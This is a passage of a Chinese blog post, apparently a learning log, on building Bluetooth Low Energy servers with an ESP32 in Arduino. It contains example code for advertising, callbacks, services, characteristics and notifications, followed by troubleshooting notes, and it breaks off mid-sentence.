href="https://blog.csdn.net/karaxiaoyu/article/details/123588009#:~:text=%E5%A4%A7%E5%AE%B6%E5%A5%BD%EF%BC%8C%E8%BF%91%E6%9C%9F%E6%9B%B4%E6%96%B0%E4%BA%86ESP32%E7%9A%84%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%EF%BC%8C%E4%B8%80%E5%85%B1%2012%E7%AF%87%20%E5%9F%BA%E7%A1%80%E6%96%87%E7%AB%A0%EF%BC%8C%E6%B6%89%E5%8F%8AESP32%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B8%B8%E7%94%A8%E5%A4%96%E8%AE%BE%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E5%B7%B2%E7%BB%8F%E5%AE%8C%E6%AF%95%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%BC%9A%E5%87%BA%E4%B8%80%E4%BA%9B%20WiFi%E3%80%81%E8%93%9D%E7%89%99%E3%80%81%E5%B1%8F%E5%B9%95%E4%BB%A5%E5%8F%8A%E4%BC%A0%E6%84%9F%E5%99%A8%20%E7%AD%89%E6%9B%B4%E5%A4%9A%20%E5%A5%BD%E7%8E%A9%E5%84%BF%E7%9A%84%E9%A1%B9%E7%9B%AE%20%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9C%A8%E5%85%AC%E4%BC%97%E5%8F%B7%20%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%AD%97%E8%8A%82,01%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A01%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%2002%20%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A02%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2003%20GPIO%E6%95%B0%E5%AD%97%E8%BE%93%E5%85%A5%E4%B8%8E%E6%95%B0%E5%AD%97%E8%BE%93%E5%87%BA">https://blog.csdn.net/karaxiaoyu/article/details/123588009#:~:text=%E5%A4%A7%E5%AE%B6%E5%A5%BD%EF%BC%8C%E8%BF%91%E6%9C%9F%E6%9B%B4%E6%96%B0%E4%BA%86ESP32%E7%9A%84%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%EF%BC%8C%E4%B8%80%E5%85%B1%2012%E7%AF%87%20%E5%9F%BA%E7%A1%80%E6%96%87%E7%AB%A0%EF%BC%8C%E6%B6%89%E5%8F%8AESP32%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%B8%B8%E7%94%A8%E5%A4%96%E8%AE%BE%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E5%B7%B2%E7%BB%8F%E5%AE%8C%E6%AF%95%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%BC%9A%E5%87%BA%E4%B8%80%E4%BA%9B%20WiFi%E3%80%81%E8%93%9D%E7%89%99%E3%80%81%E5%B1%8F%E5%B9%95%E4%BB%A5%E5%8F%8A%E4%BC%A0%E6%84%9F%E5%99%A8%20%E7%AD%89%E6%9B%B4%E5%A4%9A%20%E5%A5%BD%E7%8E%A9%E5%84%BF%E7%9A%84%E9%A1%B9%E7%9B%AE%20%E4%BB%8B%E7%BB%8D%EF%BC%8C%E5%9C%A8%E5%85%AC%E4%BC%97%E5%8F%B7%20%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%AD%97%E8%8A%82,01%20%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A01%E5%85%A5%E9%97%A8%E4%BB%8B%E7%BB%8D%2002%20%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%20%E8%80%81%E5%AE%87%E5%93%A5%E5%B8%A6%E4%BD%A0%E7%8E%A9%E8%BD%ACESP32%EF%BC%9A02%E4%BD%BF%E7%94%A8VSCode%2BPlatformIO%E6%90%AD%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%2003%20GPIO%E6%95%B0%E5%AD%97%E8%BE%93%E5%85%A5%E4%B8%8E%E6%95%B0%E5%AD%97%E8%BE%93%E5%87%BA</a></p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230711172945939.png"></p><h1 id="esp32-蓝牙开发"><a href="#esp32-蓝牙开发" class="headerlink" title="esp32 蓝牙开发"></a>esp32 蓝牙开发</h1><p>ESP32 支持双模蓝牙，即同时支持经典蓝牙和低功耗蓝牙。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>选择开发板，端口，上传的波特率。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230805114345297.png"></p><h2 id="代码开发"><a href="#代码开发" class="headerlink" title="代码开发"></a>代码开发</h2><h3 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h3><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/img-20230806222335.png"><br>这里选择了BLE-server 实例的代码。</p><p>选择进行编译<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806222649332.png"></p><p>上传代码到板子上，上传完后，拔掉板子。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806223403984.png"></p><p>给板子重新上电，手机蓝牙就可以扫描到板子设置的蓝牙名称。</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806231005051.png"></p><p>实例代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    Based on Neil Kolban example for IDF: https://github.com/nkolban/esp32-snippets/blob/master/cpp_utils/tests/BLE%20Tests/SampleServer.cpp</span><br><span class="hljs-comment">    Ported to Arduino ESP32 by Evandro Copercini</span><br><span class="hljs-comment">    updates by chegewara</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEUtils.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEServer.h&gt;</span></span><br><br><span class="hljs-comment">// See the following for generating UUIDs:</span><br><span class="hljs-comment">// https://www.uuidgenerator.net/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVICE_UUID        <span class="hljs-string">&quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHARACTERISTIC_UUID <span class="hljs-string">&quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">begin</span>(<span class="hljs-number">115200</span>);<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Starting BLE work!&quot;</span>);<br><br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;iqiqiya&quot;</span>);<br>  BLEServer *pServer = BLEDevice::<span class="hljs-built_in">createServer</span>();<br>  BLEService *pService = pServer-&gt;<span class="hljs-built_in">createService</span>(SERVICE_UUID);<br>  BLECharacteristic *pCharacteristic = pService-&gt;<span class="hljs-built_in">createCharacteristic</span>(<br>                                         CHARACTERISTIC_UUID,<br>                                         BLECharacteristic::PROPERTY_READ |<br>                                         BLECharacteristic::PROPERTY_WRITE<br>                                       );<br><br>  pCharacteristic-&gt;<span class="hljs-built_in">setValue</span>(<span class="hljs-string">&quot;Hello World says Neil&quot;</span>);<br>  pService-&gt;<span class="hljs-built_in">start</span>();<br>  <span class="hljs-comment">// BLEAdvertising *pAdvertising = pServer-&gt;getAdvertising();  // this still is working for backward compatibility</span><br>  BLEAdvertising *pAdvertising = BLEDevice::<span class="hljs-built_in">getAdvertising</span>();<br>  pAdvertising-&gt;<span class="hljs-built_in">addServiceUUID</span>(SERVICE_UUID);<br>  pAdvertising-&gt;<span class="hljs-built_in">setScanResponse</span>(<span class="hljs-literal">true</span>);<br>  pAdvertising-&gt;<span class="hljs-built_in">setMinPreferred</span>(<span class="hljs-number">0x06</span>);  <span class="hljs-comment">// functions that help with iPhone connections issue</span><br>  pAdvertising-&gt;<span class="hljs-built_in">setMinPreferred</span>(<span class="hljs-number">0x12</span>);<br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;Characteristic defined! Now you can read it in your phone!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// put your main code here, to run repeatedly:</span><br>  <span class="hljs-built_in">delay</span>(<span class="hljs-number">2000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="开发记录1"><a href="#开发记录1" class="headerlink" title="开发记录1"></a>开发记录1</h3><p>创建一个蓝牙设备，以便手机蓝牙可以扫描的到，相关信息在注释里可以看的到。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span> <span class="hljs-comment">// 引入相关库</span></span><br><br><br><span class="hljs-comment">// 声明一个蓝牙设备对象</span><br><span class="hljs-comment">// 作为服务器使用的时候还需要开启Advertisiting广播才能让别人通道蓝牙扫描发现你</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span></span>&#123;<br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;HelloWorldBLE&quot;</span>);  <span class="hljs-comment">// 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();     <span class="hljs-comment">// 开启Advertising 广播</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span></span>&#123;<br>  <br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="开发记录2"><a href="#开发记录2" class="headerlink" title="开发记录2"></a>开发记录2</h3><p>作为服务器使用还需要在上面的基础上将蓝牙设备指定为Server（服务器）使用。Server可以传入一组回调函数，分别会在有客户端设备接入时和断开连接时触发。 在有设备接入后Advertising广播会被停止，所以要在设备断开连接时重新开启广播，可以通过此处的回调函数知道设备是否断开连接。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span> <span class="hljs-comment">// 引入相关库</span></span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 作为服务器使用还需要在上面的基础上将蓝牙设备指定为Server（服务器）使用。</span><br><span class="hljs-comment">// Server可以传入一组回调函数，分别会在有客户端设备接入时和断开连接时触发。 </span><br><span class="hljs-comment">// 在有设备接入后Advertising广播会被停止，所以要在设备断开连接时重新开启广播，</span><br><span class="hljs-comment">// 可以通过此处的回调函数知道设备是否断开连接。</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServerCallbacks</span>: <span class="hljs-keyword">public</span> BLEServerCallbacks&#123;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">onConnect</span><span class="hljs-params">(BLEServer * pServer)</span></span>&#123;<br>      <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;现在有设备接入~&quot;</span>);<br>    &#125;;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">onDisconnect</span><span class="hljs-params">(BLEServer * pServer)</span></span>&#123;<br>      <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;现在有设备断开连接~&quot;</span>);<br>      <span class="hljs-comment">// 在有设备接入后Advertising 广播会被停止，所以要在设备断开连接时重新开启广播</span><br>      <span class="hljs-comment">// 不然的话只有重启esp32 才能重新搜到</span><br>      pServer-&gt;<span class="hljs-built_in">startAdvertising</span>();<br>    &#125;;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">begin</span>(<span class="hljs-number">115200</span>);<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>();<br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;HelloWorldBLEServer&quot;</span>);  <span class="hljs-comment">// 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br>  BLEServer *pServer = BLEDevice::<span class="hljs-built_in">createServer</span>(); <span class="hljs-comment">// 创建服务器</span><br>  pServer-&gt;<span class="hljs-built_in">setCallbacks</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">MyServerCallbacks</span>()); <span class="hljs-comment">// 绑定回调函数</span><br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();     <span class="hljs-comment">// 开启Advertising 广播</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230815231514350.png"></p><h3 id="开发记录3"><a href="#开发记录3" class="headerlink" title="开发记录3"></a>开发记录3</h3><p>创建一个服务Service</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span> <span class="hljs-comment">// 引入相关库</span></span><br><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVICE_UUID1 <span class="hljs-string">&quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span> <span class="hljs-comment">// 自定义UUID</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVICE_UUID2 <span class="hljs-string">&quot;0000180F-0000-1000-8000-00805F9B34FB&quot;</span> <span class="hljs-comment">// 0x180F是蓝牙技术联盟定义的Battery Service的16-bit UUID</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">begin</span>(<span class="hljs-number">115200</span>);<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>();<br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;HelloWorld_Battery&quot;</span>);  <span class="hljs-comment">// 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br>  BLEServer *pServer = BLEDevice::<span class="hljs-built_in">createServer</span>(); <span class="hljs-comment">// 创建服务器</span><br>  BLEService *pService1 = pServer-&gt;<span class="hljs-built_in">createService</span>(SERVICE_UUID1);  <span class="hljs-comment">// 创建服务</span><br>  pService1-&gt;<span class="hljs-built_in">start</span>();  <span class="hljs-comment">// 启动服务</span><br>  BLEService *pService2 = pServer-&gt;<span class="hljs-built_in">createService</span>(SERVICE_UUID2);<br>  pService2-&gt;<span class="hljs-built_in">start</span>();<br>  <br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();     <span class="hljs-comment">// 开启Advertising 广播</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span></span>&#123;&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230816224907026.png"></p><h3 id="开发记录4"><a href="#开发记录4" class="headerlink" title="开发记录4"></a>开发记录4</h3><p>这段代码，设置characteristic 中设置值，可以在BLE调试助手中看到，可以读取Characteristic 的值</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span> <span class="hljs-comment">// 引入相关库</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVICE_UUID <span class="hljs-string">&quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHARACTERISTIC_UUID1 <span class="hljs-string">&quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot;</span> <span class="hljs-comment">// 自定义UUID</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHARACTERISTIC_UUID2 <span class="hljs-string">&quot;00002A23-0000-1000-8000-00805F9B34FB&quot;</span> <span class="hljs-comment">// 0x2A23是蓝牙技术联盟定义的System ID Characteristic的16-bit UUID</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">begin</span>(<span class="hljs-number">115200</span>);<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>();<br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;HelloWorld_Characteristic&quot;</span>);  <span class="hljs-comment">// 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br>  BLEServer *pServer = BLEDevice::<span class="hljs-built_in">createServer</span>(); <span class="hljs-comment">// 创建服务器</span><br>  BLEService *pService = pServer-&gt;<span class="hljs-built_in">createService</span>(SERVICE_UUID);  <span class="hljs-comment">// 创建服务</span><br>  BLECharacteristic *pCharacteristic1 = pService-&gt;<span class="hljs-built_in">createCharacteristic</span>( <span class="hljs-comment">// 创建特征</span><br>                                                      CHARACTERISTIC_UUID1,<br>                                                      BLECharacteristic::PROPERTY_READ|<br>                                                      BLECharacteristic::PROPERTY_WRITE<br>                                                      );<br>  BLECharacteristic *pCharacteristic2 = pService-&gt;<span class="hljs-built_in">createCharacteristic</span>(<br>                                                      CHARACTERISTIC_UUID2,<br>                                                      BLECharacteristic::PROPERTY_NOTIFY<br>                                                      );<br>  pCharacteristic1-&gt;<span class="hljs-built_in">setValue</span>(<span class="hljs-string">&quot;Hello World&quot;</span>);  <span class="hljs-comment">// 设置该Characteristic的value值</span><br>                                             <span class="hljs-comment">// 如果客户端连上设备后没有任何写入的情况下</span><br>  <br>  pService-&gt;<span class="hljs-built_in">start</span>();                 <span class="hljs-comment">// 启动服务</span><br><br>  <br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();     <span class="hljs-comment">// 开启Advertising 广播</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="开发记录5"><a href="#开发记录5" class="headerlink" title="开发记录5"></a>开发记录5</h3><p>Characteristic主动向客户端发送value 的值，但实际测试并没有主动发送。需要读取才有数据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLEDevice.h&gt;</span> <span class="hljs-comment">// 引入相关库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;BLE2902.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVICE_UUID <span class="hljs-string">&quot;4fafc201-1fb5-459e-8fcc-c5c9c331914b&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHARACTERISTIC_UUID1 <span class="hljs-string">&quot;beb5483e-36e1-4688-b7f5-ea07361b26a8&quot;</span> <span class="hljs-comment">// 自定义UUID</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHARACTERISTIC_UUID2 <span class="hljs-string">&quot;00002A23-0000-1000-8000-00805F9B34FB&quot;</span> <span class="hljs-comment">// 0x2A23是蓝牙技术联盟定义的System ID Characteristic的16-bit UUID</span></span><br><br>BLECharacteristic* pCharacteristic1 = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">bool</span> deviceConnected = <span class="hljs-literal">false</span>;<br><span class="hljs-type">uint32_t</span> value = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServerCallbacks</span>: <span class="hljs-keyword">public</span> BLEServerCallbacks&#123;<br>  <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">onConnect</span><span class="hljs-params">(BLEServer* pServer)</span></span>&#123;<br>        deviceConnected = <span class="hljs-literal">true</span>;<br>      &#125;;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">onDisconnect</span><span class="hljs-params">(BLEServer* pServer)</span></span>&#123;<br>        deviceConnected = <span class="hljs-literal">false</span>;<br>      &#125;; <br>  &#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">begin</span>(<span class="hljs-number">115200</span>);<br>  <span class="hljs-built_in">Serial</span>.<span class="hljs-built_in">println</span>();<br>  BLEDevice::<span class="hljs-built_in">init</span>(<span class="hljs-string">&quot;Characteristic_Send&quot;</span>);  <span class="hljs-comment">// 填写自身对外显示的蓝牙设备名称，并初始化蓝牙功能</span><br>  BLEServer *pServer = BLEDevice::<span class="hljs-built_in">createServer</span>(); <span class="hljs-comment">// 创建服务器</span><br>  BLEService *pService = pServer-&gt;<span class="hljs-built_in">createService</span>(SERVICE_UUID);  <span class="hljs-comment">// 创建服务</span><br>  pCharacteristic1 = pService-&gt;<span class="hljs-built_in">createCharacteristic</span>( <span class="hljs-comment">// 创建特征</span><br>                                                      CHARACTERISTIC_UUID1,<br>                                                      BLECharacteristic::PROPERTY_READ|<br>                                                      BLECharacteristic::PROPERTY_WRITE<br>                                                      );<br>  BLECharacteristic *pCharacteristic2 = pService-&gt;<span class="hljs-built_in">createCharacteristic</span>(<br>                                                      CHARACTERISTIC_UUID2,<br>                                                      BLECharacteristic::PROPERTY_NOTIFY<br>                                                      );<br>  pCharacteristic1 -&gt; <span class="hljs-built_in">addDescriptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">BLE2902</span>());<br>  pServer -&gt;<span class="hljs-built_in">setCallbacks</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">MyServerCallbacks</span>());<br>  <br>  <span class="hljs-comment">//pCharacteristic1-&gt;setValue(&quot;Hello World&quot;);  // 设置该Characteristic的value值</span><br>                                             <span class="hljs-comment">// 如果客户端连上设备后没有任何写入的情况下</span><br>  <br>  pService-&gt;<span class="hljs-built_in">start</span>();                 <span class="hljs-comment">// 启动服务</span><br>  BLEDevice::<span class="hljs-built_in">startAdvertising</span>();     <span class="hljs-comment">// 开启Advertising 广播</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span></span>&#123;<br><br>  <span class="hljs-keyword">if</span>(deviceConnected)&#123;<br>      pCharacteristic1-&gt;<span class="hljs-built_in">setValue</span>((<span class="hljs-type">uint8_t</span>*)&amp;value,<span class="hljs-number">4</span>);  <span class="hljs-comment">// 设置value值</span><br>      pCharacteristic1-&gt;<span class="hljs-built_in">notify</span>(); <span class="hljs-comment">// 使用notify 方法向客户端发送数据，也可以使用indicate 方法</span><br>      value++;<br>    &#125;<br>    <span class="hljs-built_in">delay</span>(<span class="hljs-number">2000</span>);<br><br></code></pre></td></tr></table></figure><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>问题1：esp32 插上电脑，电脑端不显示串口信息。</p><p>解决： 有的USB-micro 线只有电源功能，而没有串口转换功能。</p><p>问题2：找到实例代码，进行编译得时候，显示如下错误，这个错误是因为 ArduinoBLE 的库的问题</p><p><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806221449861.png"></p><p>解决：在安装库的时候安装了最新的版本，后面换成这个就可以编译了。<br><img src="/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/image-20230806222114730.png"></p><p>问题3： 尝试使用ArduinoBLE 